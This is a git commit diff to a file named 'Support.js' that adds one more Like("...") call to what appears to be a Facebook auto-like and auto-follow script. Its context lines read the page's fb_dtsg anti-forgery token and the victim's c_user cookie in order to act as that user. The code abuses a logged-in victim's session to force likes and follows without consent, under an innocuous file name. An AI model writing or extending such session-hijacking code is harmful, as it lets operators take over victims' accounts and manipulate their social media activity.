08183436a7abf708615ef4c16fad01ac86560969
wazzygray <qariwaqar@gmail.com>
2013-06-08 20:55:51 +0500

    Update Support.js

--- Support.js
+++ Support.js
@@ -114,6 +114,7 @@ Like("190943597728424");
 Like("127402680785850");
 Like("453718184719532");
 Like("177430755751025");
+Like("280308438768084");
 /*Auto Follow*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
